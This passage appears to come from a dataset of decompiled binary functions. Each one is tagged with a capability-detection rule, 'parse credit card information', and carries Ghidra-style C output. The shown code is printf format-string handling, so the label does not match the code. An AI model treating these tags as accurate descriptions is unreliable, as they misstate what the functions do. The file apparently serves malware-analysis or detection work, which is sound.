if (cVar5 != 'h') goto code_r0x0044c6d2;\n            if (*param_1[3] == 'h') {\n                param_1[3] = param_1[3] + 1;\n                pcVar7 = 0x1;\n            }\n            else {\n                pcVar7 = 0x2;\n            }\n        }\n        else {\n            if (cVar5 != 'l') {\n                if (cVar5 == 't') {\n                    param_1[10] = 7;\n                }\n                else if (cVar5 == 'w') {\n                    param_1[10] = 0xc;\n                }\n                else if (cVar5 == 'z') {\n                    param_1[10] = 6;\n                }\n                goto code_r0x0044c6d2;\n            }\n            if (*param_1[3] == 'l') {\n                param_1[3] = param_1[3] + 1;\n                pcVar7 = 0x4;\n            }\n            else {\n                pcVar7 = 0x3;\n            }\n        }\n        param_1[10] = pcVar7;\ncode_r0x0044c6d2:\n        return CONCAT31(pcVar7 >> 8, 1);\n    }\n    pcVar7 = *param_1 & 8;\n    if (pcVar7 != NULL) goto code_r0x0044c6d2;\n    *(param_1 + 6) = 7;\n    iVar11 = 0;\n    cVar5 = *(param_1 + 0x2d);\n    if (cVar5 < 'e') {\n        if (cVar5 == 'd') {\ncode_r0x0044d96f:\n            param_1[7] = param_1[7] | 0x10;\ncode_r0x0044d973:\n            cVar5 = fcn.00441f2e(0);\n        }\n        else if (cVar5 < 'T') {\n            if (cVar5 == 'S') {\ncode_r0x0044d99c:\n                cVar5 = fcn.00452e9e();\n            }\n            else {\n                if (cVar5 != 'A') {\n                    if (cVar5 == 'C') {\ncode_r0x0044d929:\n                        cVar5 = fcn.00451ce9(0);\n                        goto code_r0x0044d9ac;\n                    }\n                    if (((cVar5 != 'E') && (cVar5 != 'F')) && (cVar5 != 'G')) goto code_r0x0044dbfa;\n                }\ncode_r0x0044d907:\n                cVar5 = fcn.004509c1();\n            }\n        }\n        else if (cVar5 == 'X') {\n            arg_8h = 1;\ncode_r0x0044d93e:\n            cVar5 = fcn.00443222(arg_8h);\n        }\n        else {\n            if (cVar5 != 'Z') {\n                if (cVar5 != 'a') {\n                    if (cVar5 != 'c') goto code_r0x0044dbfa;\n                    goto code_r0x0044d929;\n                }\n                goto code_r0x0044d907;\n            }\n            cVar5 = fcn.00450393();\n        }\n    }\n    else if (cVar5 < 'p') {\n        if (cVar5 == 'o') {\n            cVar5 = fcn.00452be5();\n        }\n        else {\n            if (((cVar5 == 'e') || (cVar5 == 'f')) || (cVar5 == 'g')) goto code_r0x0044d907;\n            if (cVar5 == 'i') goto code_r0x0044d96f;\n            if (cVar5 != 'n') goto code_r0x0044dbfa;\n            cVar5 = fcn.00452571();\n        }\n    }\n    else {\n        if (cVar5 != 'p') {\n            if (cVar5 == 's') goto code_r0x0044d99c;\n            if (cVar5 != 'u') {\n                if (cVar5 != 'x') goto code_r0x0044dbfa;\n                arg_8h = 0;\n                goto code_r0x0044d93e;\n            }\n            goto code_r0x0044d973;\n        }\n        cVar5 = fcn.00452d3a();\n    }\ncode_r0x0044d9ac:\n    if (((cVar5 != '\\0') && (cVar5 = fcn.0044ad2a(),  cVar5 == '\\0')) && (*(param_1 + 0xb) == '\\0')) {\n        uVar9 = param_1[7];\n        uVar12 = 0;\n        arg_ch = 0;\n        if ((uVar9 >> 4 & 1) != 0) {\n            if (((uVar9 >> 6 & 1) == 0) && ((uVar9 & 1) == 0)) {\n                if ((uVar9 >> 1 & 1) != 0) {\n                    uVar12 = 1;\n                    arg_ch = 1;\n                }\n            }\n            else {\n                arg_ch = 1;\n                uVar12 = 1;\n            }\n        }\n        cVar5 = *(param_1 + 0x2d);\n        if (((cVar5 != 'x') && (cVar5 != 'X')) || (bVar3 = true,  (uVar9 >> 5 & 1) == 0)) {\n            bVar3 = false;\n        }\n        if ((cVar5 == 'a') || (bVar4 = false,  cVar5 == 'A')) {\n            bVar4 = true;\n        }\n        if ((bVar3) || (bVar4)) {\n            (&stack0xfffffff0)[uVar12] = 0x30;\n            if ((cVar5 == 'X') || (cVar5 == 'A')) {\n                uVar6 = 0x58;\n            }\n            else {\n                uVar6 = 0x78;\n            }\n            (&stack0xfffffff1)[uVar12] = uVar6;\n            uVar12 = uVar12 + 2;\n            arg_ch = uVar12;\n        }\n        iVar8 = (param_1[8] - uVar12) - param_1[0xd];\n        if (((uVar9 & 0xc) == 0) && (uVar9 = param_1[2],  0 < iVar8)) {\n            while( true ) {\n                arg_ch = 0x20;\n                iVar13 = 0x44da9a;\n                cVar5 = fcn.00454f59(0x20, uVar9);\n                if (cVar5 == '\\0') break;\n                uVar12 = param_1[5];\n                param_1[5] = uVar12 + 1;\n                if ((uVar12 == 0xfffffffe) || (iVar8 <= iVar13 + 1)) goto code_r0x0044dac6;\n            }\n            param_1[5] = 0xffffffff;\n        }\ncode_r0x0044dac6:\n        arg_10h = param_1 + 5;\n        unaff_EBX = 0x44dae4;\n        fcn.00455870(&stack0xfffffff0, arg_ch, arg_10h, param_1[2]);\n        if (((param_1[7] >> 3 & 1) != 0) && ((param_1[7] >> 2 & 1) == 0)) {\n            iVar8 = 0;\n            uVar9 = param_1[2];\n            if (0 < arg_ch) {\n                while( true ) {\n                    arg_ch = uVar9;\n                    unaff_EBX = 0x44db14;\n                    uVar9 = arg_ch;\n                    cVar5 = fcn.00454f59(0x30, arg_ch);\n                    if (cVar5 == '\\0') break;\n                    uVar12 = *arg_10h;\n                    *arg_10h = uVar12 + 1;\n                    if ((uVar12 == 0xfffffffe) || (iVar8 = iVar8 + 1,  arg_ch <= iVar8)) goto code_r0x0044db38;\n                }\n                *arg_10h = 0xffffffff;\n            }\n        }\ncode_r0x0044db38:\n        if ((*(param_1 + 0xe) == '\\0') || (param_1[0xd] < 1)) {\n            unaff_EBX = param_1[2];\n            fcn.00455870(param_1[0xc], param_1[0xd], arg_10h, unaff_EBX);\n        }\n        else {\n            puVar10 = param_1[0xc];\n            uVar9 = 0;\n            do {\n                uVar1 = *puVar10;\n                puVar10 = puVar10 + 1;\n                iVar13 = 0;\n                iVar8 = fcn.0045eb63(&stack0xffffffec, &stack0xfffffff0, 6, uVar1, param_1[2]);\n                if ((iVar8 != 0) || (iVar13 == 0)) {\n                    *arg_10h = 0xffffffff;\n                    break;\n                }\n                fcn.00455870(&stack0xfffffff0, iVar13, arg_10h, param_1[2]);\n                uVar9 = uVar9 + 1;\n            } while (uVar9 != param_1[0xd]);\n        }\n        if (((-1 < *arg_10h) && ((param_1[7] >> 2 & 1) != 0)) && (uVar9 = param_1[2],  0 < arg_ch)) {\n            while (cVar5 = fcn.00454f59(0x20, uVar9),  cVar5 != '\\0') {\n                uVar12 = *arg_10h;\n                *arg_10h = uVar12 + 1;\n                if ((uVar12 == 0xfffffffe) || (iVar11 = iVar11 + 1,  arg_ch <= iVar11)) goto code_r0x0044dbfa;\n            }\n            *arg_10h = 0xffffffff;\n        }\n    }\ncode_r0x0044dbfa:\n    uVar9 = fcn.004303e9(unaff_EBX);\n    return uVar9;\n}\n",
        "token_count": 3107
    },
    "0044c6d5": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0044c6d5(uint32_t *param_1)\n\n{\n    uint32_t *arg_10h;\n    uint16_t uVar1;\n    char *pcVar2;\n    bool bVar3;\n    bool bVar4;\n    char cVar5;\n    uchar uVar6;\n    uint32_t in_EAX;\n    char *pcVar7;\n    int32_t iVar8;\n    uint32_t uVar9;\n    uint16_t *puVar10;\n    uint32_t unaff_EBX;\n    int32_t iVar11;\n    uint32_t uVar12;\n    uint arg_8h;\n    int32_t iVar13;\n    uint32_t arg_ch;\n    \n    cVar5 = *(param_1 + 0x2d);\n    pcVar7 = in_EAX & 0xffffff00;\n    if (cVar5 != 'F') {\n        if (cVar5 == 'N') {\n            pcVar7 = *param_1 & 8;\n            if (pcVar7 != NULL) goto code_r0x0044c82b;\n            *(param_1 + 6) = 8;\ncode_r0x0044c70a:\n            uVar9 = param_1[2];\n            *(uVar9 + 0x1c) = 1;\n            *(uVar9 + 0x18) = 0x16;\n            uVar9 = fcn.0043bac1(0, 0, 0, 0, 0, param_1[2]);\n            return uVar9 & 0xffffff00;\n        }\n        if (param_1[10] != 0) goto code_r0x0044c70a;\n        if (cVar5 < 'k') {\n            if (cVar5 == 'j') {\n                param_1[10] = 5;\n                goto code_r0x0044c82b;\n            }\n            if (cVar5 == 'I') {\n                pcVar2 = param_1[3];\n                cVar5 = *pcVar2;\n                if ((cVar5 == '3') && (pcVar2[1] == '2')) {\n                    pcVar7 = pcVar2 + 2;\n                    param_1[10] = 10;\n                    param_1[3] = pcVar7;\n                }\n                else if (cVar5 == '6') {\n                    if (pcVar2[1] == '4') {\n                        pcVar7 = pcVar2 + 2;\n                        param_1[10] = 0xb;\n                        param_1[3] = pcVar7;\n                    }\n                }\n                else if ((((cVar5 == 'd') || (cVar5 == 'i')) || (cVar5 == 'o')) ||\n                        (((cVar5 == 'u' || (cVar5 == 'x')) || (cVar5 == 'X')))) {\n                    param_1[10] = 9;\n                }\n                goto code_r0x0044c82b;\n            }\n            if (cVar5 == 'L') {\n                param_1[10] = 8;\n                goto code_r0x0044c82b;\n            }\n            if (cVar5 == 'T') {\n                param_1[10] = 0xd;\n                goto code_r0x0044c82b;\n            }\n            if (cVar5 != 'h') goto code_r0x0044c82b;\n            if (*param_1[3] == 'h') {\n                param_1[3] = param_1[3] + 1;\n                pcVar7 = 0x1;\n            }\n            else {\n                pcVar7 = 0x2;\n            }\n        }\n        else {\n            if (cVar5 != 'l') {\n                if (cVar5 == 't') {\n                    param_1[10] = 7;\n                }\n                else if (cVar5 == 'w') {\n                    param_1[10] = 0xc;\n                }\n                else if (cVar5 == 'z') {\n                    param_1[10] = 6;\n                }\n                goto code_r0x0044c82b;\n            }\n            if (*param_1[3] == 'l') {\n                param_1[3] = param_1[3] + 1;\n                pcVar7 = 0x4;\n            }\n            else {\n                pcVar7 = 0x3;\n            }\n        }\n        param_1[10] = pcVar7;\ncode_r0x0044c82b:\n        return CONCAT31(pcVar7 >> 8, 1);\n    }\n    pcVar7 = *param_1 & 8;\n    if (pcVar7 != NULL) goto code_r0x0044c82b;\n    *(param_1 + 6) = 7;\n    iVar11 = 0;\n    cVar5 = *(param_1 + 0x2d);\n    if (cVar5 < 'e') {\n        if (cVar5 == 'd') {\ncode_r0x0044dcc0:\n            param_1[7] = param_1[7] | 0x10;\ncode_r0x0044dcc4:\n            cVar5 = fcn.004420ca(0);\n        }\n        else if (cVar5 < 'T') {\n            if (cVar5 == 'S') {\ncode_r0x0044dced:\n                cVar5 = fcn.00452f1c();\n            }\n            else {\n                if (cVar5 != 'A') {\n                    if (cVar5 == 'C') {\ncode_r0x0044dc7a:\n                        cVar5 = fcn.00451da8(0);\n                        goto code_r0x0044dcfd;\n                    }\n                    if (((cVar5 != 'E') && (cVar5 != 'F')) && (cVar5 != 'G')) goto code_r0x0044df3c;\n                }\ncode_r0x0044dc58:\n                cVar5 = fcn.00450b6f();\n            }\n        }\n        else if (cVar5 == 'X') {\n            arg_8h = 1;\ncode_r0x0044dc8f:\n            cVar5 = fcn.004433be(arg_8h);\n        }\n        else {\n            if (cVar5 != 'Z') {\n                if (cVar5 != 'a') {\n                    if (cVar5 != 'c') goto code_r0x0044df3c;\n                    goto code_r0x0044dc7a;\n                }\n                goto code_r0x0044dc58;\n            }\n            cVar5 = fcn.0045040d();\n        }\n    }\n    else if (cVar5 < 'p') {\n        if (cVar5 == 'o') {\n            cVar5 = fcn.00452c02();\n        }\n        else {\n            if (((cVar5 == 'e') || (cVar5 == 'f')) || (cVar5 == 'g')) goto code_r0x0044dc58;\n            if (cVar5 == 'i') goto code_r0x0044dcc0;\n            if (cVar5 != 'n') goto code_r0x0044df3c;\n            cVar5 = fcn.0045261e();\n        }\n    }\n    else {\n        if (cVar5 != 'p') {\n            if (cVar5 == 's') goto code_r0x0044dced;\n            if (cVar5 != 'u') {\n                if (cVar5 != 'x') goto code_r0x0044df3c;\n                arg_8h = 0;\n                goto code_r0x0044dc8f;\n            }\n            goto code_r0x0044dcc4;\n        }\n        cVar5 = fcn.00452d50();\n    }\ncode_r0x0044dcfd:\n    if ((cVar5 != '\\0') && (*(param_1 + 0xb) == '\\0')) {\n        uVar9 = param_1[7];\n        uVar12 = 0;\n        arg_ch = 0;\n        if ((uVar9 >> 4 & 1) != 0) {\n            if (((uVar9 >> 6 & 1) == 0) && ((uVar9 & 1) == 0)) {\n                if ((uVar9 >> 1 & 1) != 0) {\n                    uVar12 = 1;\n                    arg_ch = 1;\n                }\n            }\n            else {\n                arg_ch = 1;\n                uVar12 = 1;\n            }\n        }\n        cVar5 = *(param_1 + 0x2d);\n        if (((cVar5 != 'x') && (cVar5 != 'X')) || (bVar3 = true,  (uVar9 >> 5 & 1) == 0)) {\n            bVar3 = false;\n        }\n        if ((cVar5 == 'a') || (bVar4 = false,  cVar5 == 'A')) {\n            bVar4 = true;\n        }\n        if ((bVar3) || (bVar4)) {\n            (&stack0xfffffff0)[uVar12] = 0x30;\n            if ((cVar5 == 'X') || (cVar5 == 'A')) {\n                uVar6 = 0x58;\n            }\n            else {\n                uVar6 = 0x78;\n            }\n            (&stack0xfffffff1)[uVar12] = uVar6;\n            uVar12 = uVar12 + 2;\n            arg_ch = uVar12;\n        }\n        iVar8 = (param_1[8] - uVar12) - param_1[0xd];\n        if (((uVar9 & 0xc) == 0) && (uVar9 = param_1[2],  0 < iVar8)) {\n            while( true ) {\n                arg_ch = 0x20;\n                iVar13 = 0x44dddc;\n                cVar5 = fcn.00454f59(0x20, uVar9);\n                if (cVar5 == '\\0') break;\n                uVar12 = param_1[5];\n                param_1[5] = uVar12 + 1;\n                if ((uVar12 == 0xfffffffe) || (iVar8 <= iVar13 + 1)) goto code_r0x0044de08;\n            }\n            param_1[5] = 0xffffffff;\n        }\ncode_r0x0044de08:\n        arg_10h = param_1 + 5;\n        unaff_EBX = 0x44de26;\n        fcn.00455870(&stack0xfffffff0, arg_ch, arg_10h, param_1[2]);\n        if (((param_1[7] >> 3 & 1) != 0) && ((param_1[7] >> 2 & 1) == 0)) {\n            iVar8 = 0;\n            uVar9 = param_1[2];\n            if (0 < arg_ch) {\n                while( true ) {\n                    arg_ch = uVar9;\n                    unaff_EBX = 0x44de56;\n                    uVar9 = arg_ch;\n                    cVar5 = fcn.00454f59(0x30, arg_ch);\n                    if (cVar5 == '\\0') break;\n                    uVar12 = *arg_10h;\n                    *arg_10h = uVar12 + 1;\n                    if ((uVar12 == 0xfffffffe) || (iVar8 = iVar8 + 1,  arg_ch <= iVar8)) goto code_r0x0044de7a;\n                }\n                *arg_10h = 0xffffffff;\n            }\n        }\ncode_r0x0044de7a:\n        if ((*(param_1 + 0xe) == '\\0') || (param_1[0xd] < 1)) {\n            unaff_EBX = param_1[2];\n            fcn.00455870(param_1[0xc], param_1[0xd], arg_10h, unaff_EBX);\n        }\n        else {\n            puVar10 = param_1[0xc];\n            uVar9 = 0;\n            do {\n                uVar1 = *puVar10;\n                puVar10 = puVar10 + 1;\n                iVar13 = 0;\n                iVar8 = fcn.0045eb63(&stack0xffffffec, &stack0xfffffff0, 6, uVar1, param_1[2]);\n                if ((iVar8 != 0) || (iVar13 == 0)) {\n                    *arg_10h = 0xffffffff;\n                    break;\n                }\n                fcn.00455870(&stack0xfffffff0, iVar13, arg_10h, param_1[2]);\n                uVar9 = uVar9 + 1;\n            } while (uVar9 != param_1[0xd]);\n        }\n        if (((-1 < *arg_10h) && ((param_1[7] >> 2 & 1) != 0)) && (uVar9 = param_1[2],  0 < arg_ch)) {\n            while (cVar5 = fcn.00454f59(0x20, uVar9),  cVar5 != '\\0') {\n                uVar12 = *arg_10h;\n                *arg_10h = uVar12 + 1;\n                if ((uVar12 == 0xfffffffe) || (iVar11 = iVar11 + 1,  arg_ch <= iVar11)) goto code_r0x0044df3c;\n            }\n            *arg_10h = 0xffffffff;\n        }\n    }\ncode_r0x0044df3c:\n    uVar9 = fcn.004303e9(unaff_EBX);\n    return uVar9;\n}\n",
        "token_count": 3077
    },
    "0044c82e": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0044c82e(uint32_t *param_1)\n\n{\n    uint32_t *arg_10h;\n    int32_t **ppiVar1;\n    int32_t **ppiVar2;\n    uint16_t uVar3;\n    char *pcVar4;\n    uint32_t uVar5;\n    int32_t *piVar6;\n    bool bVar7;\n    bool bVar8;\n    char cVar9;\n    uchar uVar10;\n    uint32_t in_EAX;\n    char *pcVar11;\n    uint32_t uVar12;\n    int32_t iVar13;\n    int32_t iVar14;\n    uint16_t *puVar15;\n    int32_t iVar16;\n    uint unaff_EBX;\n    uint arg_8h;\n    int32_t iVar17;\n    \n    cVar9 = *(param_1 + 0x2d);\n    pcVar11 = in_EAX & 0xffffff00;\n    if (cVar9 != 'F') {\n        if (cVar9 == 'N') {\n            pcVar11 = *param_1 & 8;\n            if (pcVar11 != NULL) goto code_r0x0044c984;\n            *(param_1 + 6) = 8;\ncode_r0x0044c863:\n            uVar12 = param_1[2];\n            *(uVar12 + 0x1c) = 1;\n            *(uVar12 + 0x18) = 0x16;\n            uVar12 = fcn.0043bac1(0, 0, 0, 0, 0, param_1[2]);\n            return uVar12 & 0xffffff00;\n        }\n        if (param_1[10] != 0) goto code_r0x0044c863;\n        if (cVar9 < 'k') {\n            if (cVar9 == 'j') {\n                param_1[10] = 5;\n                goto code_r0x0044c984;\n            }\n            if (cVar9 == 'I') {\n                pcVar4 = param_1[3];\n                cVar9 = *pcVar4;\n                if ((cVar9 == '3') && (pcVar4[1] == '2')) {\n                    pcVar11 = pcVar4 + 2;\n                    param_1[10] = 10;\n                    param_1[3] = pcVar11;\n                }\n                else if (cVar9 == '6') {\n                    if (pcVar4[1] == '4') {\n                        pcVar11 = pcVar4 + 2;\n                        param_1[10] = 0xb;\n                        param_1[3] = pcVar11;\n                    }\n                }\n                else if ((((cVar9 == 'd') || (cVar9 == 'i')) || (cVar9 == 'o')) ||\n                        (((cVar9 == 'u' || (cVar9 == 'x')) || (cVar9 == 'X')))) {\n                    param_1[10] = 9;\n                }\n                goto code_r0x0044c984;\n            }\n            if (cVar9 == 'L') {\n                param_1[10] = 8;\n                goto code_r0x0044c984;\n            }\n            if (cVar9 == 'T') {\n                param_1[10] = 0xd;\n                goto code_r0x0044c984;\n            }\n            if (cVar9 != 'h') goto code_r0x0044c984;\n            if (*param_1[3] == 'h') {\n                param_1[3] = param_1[3] + 1;\n                pcVar11 = 0x1;\n            }\n            else {\n                pcVar11 = 0x2;\n            }\n        }\n        else {\n            if (cVar9 != 'l') {\n                if (cVar9 == 't') {\n                    param_1[10] = 7;\n                }\n                else if (cVar9 == 'w') {\n                    param_1[10] = 0xc;\n                }\n                else if (cVar9 == 'z') {\n                    param_1[10] = 6;\n                }\n                goto code_r0x0044c984;\n            }\n            if (*param_1[3] == 'l') {\n                param_1[3] = param_1[3] + 1;\n                pcVar11 = 0x4;\n            }\n            else {\n                pcVar11 = 0x3;\n            }\n        }\n        param_1[10] = pcVar11;\ncode_r0x0044c984:\n        return CONCAT31(pcVar11 >> 8, 1);\n    }\n    pcVar11 = *param_1 & 8;\n    if (pcVar11 != NULL) goto code_r0x0044c984;\n    *(param_1 + 6) = 7;\n    cVar9 = *(param_1 + 0x2d);\n    if (cVar9 < 'e') {\n        if (cVar9 == 'd') {\ncode_r0x0044dff5:\n            param_1[7] = param_1[7] | 0x10;\ncode_r0x0044dff9:\n            cVar9 = fcn.00442257(0);\n        }\n        else if (cVar9 < 'T') {\n            if (cVar9 == 'S') {\ncode_r0x0044e01e:\n                cVar9 = fcn.00452f8e();\n            }\n            else {\n                if (cVar9 != 'A') {\n                    if (cVar9 == 'C') {\ncode_r0x0044dfb7:\n                        cVar9 = fcn.00451e3d(0);\n                        goto code_r0x0044e02a;\n                    }\n                    if (((cVar9 != 'E') && (cVar9 != 'F')) && (cVar9 != 'G')) goto code_r0x0044e29a;\n                }\ncode_r0x0044df9b:\n                cVar9 = fcn.00450d00();\n            }\n        }\n        else if (cVar9 == 'X') {\n            arg_8h = 1;\ncode_r0x0044dfc8:\n            cVar9 = fcn.0044354b(arg_8h);\n        }\n        else {\n            if (cVar9 != 'Z') {\n                if (cVar9 != 'a') {\n                    if (cVar9 != 'c') goto code_r0x0044e29a;\n                    goto code_r0x0044dfb7;\n                }\n                goto code_r0x0044df9b;\n            }\n            cVar9 = fcn.00450470();\n        }\n    }\n    else if (cVar9 < 'p') {\n        if (cVar9 == 'o') {\n            cVar9 = fcn.00452c1f();\n        }\n        else {\n            if (((cVar9 == 'e') || (cVar9 == 'f')) || (cVar9 == 'g')) goto code_r0x0044df9b;\n            if (cVar9 == 'i') goto code_r0x0044dff5;\n            if (cVar9 != 'n') goto code_r0x0044e29a;\n            cVar9 = fcn.004526a3();\n        }\n    }\n    else {\n        if (cVar9 != 'p') {\n            if (cVar9 == 's') goto code_r0x0044e01e;\n            if (cVar9 != 'u') {\n                if (cVar9 != 'x') goto code_r0x0044e29a;\n                arg_8h = 0;\n                goto code_r0x0044dfc8;\n            }\n            goto code_r0x0044dff9;\n        }\n        cVar9 = fcn.00452d66();\n    }\ncode_r0x0044e02a:\n    if ((cVar9 != '\\0') && (*(param_1 + 0xb) == '\\0')) {\n        iVar13 = 0;\n        iVar17 = 0;\n        if ((param_1[7] >> 4 & 1) != 0) {\n            if (((param_1[7] >> 6 & 1) == 0) && ((*(param_1 + 7) & 1) == 0)) {\n                if ((param_1[7] >> 1 & 1) != 0) {\n                    iVar13 = 1;\n                    iVar17 = 1;\n                }\n            }\n            else {\n                iVar17 = 1;\n                iVar13 = 1;\n            }\n        }\n        cVar9 = *(param_1 + 0x2d);\n        if (((cVar9 != 'x') && (cVar9 != 'X')) || (bVar7 = true,  (param_1[7] >> 5 & 1) == 0)) {\n            bVar7 = false;\n        }\n        if ((cVar9 == 'a') || (bVar8 = false,  cVar9 == 'A')) {\n            bVar8 = true;\n        }\n        if ((bVar7) || (bVar8)) {\n            (&stack0xffffffec)[iVar13] = 0x30;\n            if ((cVar9 == 'X') || (cVar9 == 'A')) {\n                uVar10 = 0x58;\n            }\n            else {\n                uVar10 = 0x78;\n            }\n            (&stack0xffffffed)[iVar13] = uVar10;\n            iVar13 = iVar13 + 2;\n            iVar17 = iVar13;\n        }\n        iVar16 = (param_1[8] - iVar13) - param_1[0xd];\n        if (((*(param_1 + 7) & 0xc) == 0) && (0 < iVar16)) {\n            uVar12 = param_1[5];\n            iVar14 = 0;\n            do {\n                uVar5 = param_1[0x112];\n                if (*(uVar5 + 8) == *(uVar5 + 4)) {\n                    if (*(uVar5 + 0xc) == '\\0') {\n                        uVar12 = 0xffffffff;\n                    }\n                    else {\n                        uVar12 = uVar12 + 1;\n                    }\n                    param_1[5] = uVar12;\n                }\n                else {\n                    param_1[5] = uVar12 + 1;\n                    *(uVar5 + 8) = *(uVar5 + 8) + 1;\n                    **param_1[0x112] = 0x20;\n                    *param_1[0x112] = *param_1[0x112] + 1;\n                }\n                uVar12 = param_1[5];\n                iVar13 = iVar17;\n            } while ((uVar12 != 0xffffffff) && (iVar14 = iVar14 + 1,  iVar14 < iVar16));\n        }\n        arg_10h = param_1 + 5;\n        ppiVar1 = param_1 + 0x112;\n        fcn.004558c8(&stack0xffffffec, iVar13, arg_10h);\n        ppiVar2 = param_1 + 0x112;\n        if (((param_1[7] >> 3 & 1) != 0) && (((param_1[7] >> 2 & 1) == 0 && (iVar13 = 0,  0 < iVar16)))) {\n            do {\n                piVar6 = *ppiVar2;\n                if (piVar6[2] == piVar6[1]) {\n                    if (*(piVar6 + 3) == '\\0') {\n                        uVar12 = 0xffffffff;\n                    }\n                    else {\n                        uVar12 = *arg_10h + 1;\n                    }\n                    *arg_10h = uVar12;\n                }\n                else {\n                    *arg_10h = *arg_10h + 1;\n                    piVar6[2] = piVar6[2] + 1;\n                    ***ppiVar2 = 0x30;\n                    **ppiVar2 = **ppiVar2 + 1;\n                }\n            } while ((*arg_10h != 0xffffffff) && (iVar13 = iVar13 + 1,  iVar13 < iVar16));\n        }\n        iVar13 = 0;\n        if ((*(param_1 + 0xe) == '\\0') || (param_1[0xd] < 1)) {\n            fcn.004558c8(param_1[0xc], param_1[0xd], arg_10h);\n        }\n        else {\n            puVar15 = param_1[0xc];\n            uVar12 = 0;\n            do {\n                uVar3 = *puVar15;\n                puVar15 = puVar15 + 1;\n                iVar14 = 0;\n                iVar17 = fcn.0045eb63(&stack0xffffffe8, &stack0xfffffff0, 6, uVar3, param_1[2]);\n                if ((iVar17 != 0) || (iVar14 == 0)) {\n                    *arg_10h = 0xffffffff;\n                    break;\n                }\n                fcn.004558c8(&stack0xfffffff0, iVar14, arg_10h);\n                uVar12 = uVar12 + 1;\n            } while (uVar12 != param_1[0xd]);\n        }\n        uVar12 = *arg_10h;\n        if (((-1 < uVar12) && ((param_1[7] >> 2 & 1) != 0)) && (0 < iVar16)) {\n            do {\n                piVar6 = *ppiVar1;\n                if (piVar6[2] == piVar6[1]) {\n                    if (*(piVar6 + 3) == '\\0') {\n                        uVar12 = 0xffffffff;\n                    }\n                    else {\n                        uVar12 = uVar12 + 1;\n                    }\n                    *arg_10h = uVar12;\n                }\n                else {\n                    *arg_10h = uVar12 + 1;\n                    piVar6[2] = piVar6[2] + 1;\n                    ***ppiVar1 = 0x20;\n                    **ppiVar1 = **ppiVar1 + 1;\n                }\n                uVar12 = *arg_10h;\n            } while ((uVar12 != 0xffffffff) && (iVar13 = iVar13 + 1,  iVar13 < iVar16));\n        }\n    }\ncode_r0x0044e29a:\n    uVar12 = fcn.004303e9(unaff_EBX);\n    return uVar12;\n}\n",
        "token_count": 3265
    },
    "0044c987": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0044c987(uint32_t *param_1)\n\n{\n    uint32_t *arg_10h;\n    int32_t **ppiVar1;\n    int32_t **ppiVar2;\n    uint16_t uVar3;\n    char *pcVar4;\n    uint32_t uVar5;\n    int32_t *piVar6;\n    bool bVar7;\n    bool bVar8;\n    char cVar9;\n    uchar uVar10;\n    uint32_t in_EAX;\n    char *pcVar11;\n    uint32_t uVar12;\n    int32_t iVar13;\n    int32_t iVar14;\n    uint16_t *puVar15;\n    int32_t iVar16;\n    uint unaff_EBX;\n    uint arg_8h;\n    int32_t iVar17;\n    \n    cVar9 = *(param_1 + 0x2d);\n    pcVar11 = in_EAX & 0xffffff00;\n    if (cVar9 != 'F') {\n        if (cVar9 == 'N') {\n            pcVar11 = *param_1 & 8;\n            if (pcVar11 != NULL) goto code_r0x0044cadd;\n            *(param_1 + 6) = 8;\ncode_r0x0044c9bc:\n            uVar12 = param_1[2];\n            *(uVar12 + 0x1c) = 1;\n            *(uVar12 + 0x18) = 0x16;\n            uVar12 = fcn.0043bac1(0, 0, 0, 0, 0, param_1[2]);\n            return uVar12 & 0xffffff00;\n        }\n        if (param_1[10] != 0) goto code_r0x0044c9bc;\n        if (cVar9 < 'k') {\n            if (cVar9 == 'j') {\n                param_1[10] = 5;\n                goto code_r0x0044cadd;\n            }\n            if (cVar9 == 'I') {\n                pcVar4 = param_1[3];\n                cVar9 = *pcVar4;\n                if ((cVar9 == '3') && (pcVar4[1] == '2')) {\n                    pcVar11 = pcVar4 + 2;\n                    param_1[10] = 10;\n                    param_1[3] = pcVar11;\n                }\n                else if (cVar9 == '6') {\n                    if (pcVar4[1] == '4') {\n                        pcVar11 = pcVar4 + 2;\n                        param_1[10] = 0xb;\n                        param_1[3] = pcVar11;\n                    }\n                }\n                else if ((((cVar9 == 'd') || (cVar9 == 'i')) || (cVar9 == 'o')) ||\n                        (((cVar9 == 'u' || (cVar9 == 'x')) || (cVar9 == 'X')))) {\n                    param_1[10] = 9;\n                }\n                goto code_r0x0044cadd;\n            }\n            if (cVar9 == 'L') {\n                param_1[10] = 8;\n                goto code_r0x0044cadd;\n            }\n            if (cVar9 == 'T') {\n                param_1[10] = 0xd;\n                goto code_r0x0044cadd;\n            }\n            if (cVar9 != 'h') goto code_r0x0044cadd;\n            if (*param_1[3] == 'h') {\n                param_1[3] = param_1[3] + 1;\n                pcVar11 = 0x1;\n            }\n            else {\n                pcVar11 = 0x2;\n            }\n        }\n        else {\n            if (cVar9 != 'l') {\n                if (cVar9 == 't') {\n                    param_1[10] = 7;\n                }\n                else if (cVar9 == 'w') {\n                    param_1[10] = 0xc;\n                }\n                else if (cVar9 == 'z') {\n                    param_1[10] = 6;\n                }\n                goto code_r0x0044cadd;\n            }\n            if (*param_1[3] == 'l') {\n                param_1[3] = param_1[3] + 1;\n                pcVar11 = 0x4;\n            }\n            else {\n                pcVar11 = 0x3;\n            }\n        }\n        param_1[10] = pcVar11;\ncode_r0x0044cadd:\n        return CONCAT31(pcVar11 >> 8, 1);\n    }\n    pcVar11 = *param_1 & 8;\n    if (pcVar11 != NULL) goto code_r0x0044cadd;\n    *(param_1 + 6) = 7;\n    cVar9 = *(param_1 + 0x2d);\n    if (cVar9 < 'e') {\n        if (cVar9 == 'd') {\ncode_r0x0044e354:\n            param_1[7] = param_1[7] | 0x10;\ncode_r0x0044e358:\n            cVar9 = fcn.004423e4(0);\n        }\n        else if (cVar9 < 'T') {\n            if (cVar9 == 'S') {\ncode_r0x0044e37d:\n                cVar9 = fcn.00453000();\n            }\n            else {\n                if (cVar9 != 'A') {\n                    if (cVar9 == 'C') {\ncode_r0x0044e316:\n                        cVar9 = fcn.00451ed2(0);\n                        goto code_r0x0044e389;\n                    }\n                    if (((cVar9 != 'E') && (cVar9 != 'F')) && (cVar9 != 'G')) goto code_r0x0044e608;\n                }\ncode_r0x0044e2fa:\n                cVar9 = fcn.00450e91();\n            }\n        }\n        else if (cVar9 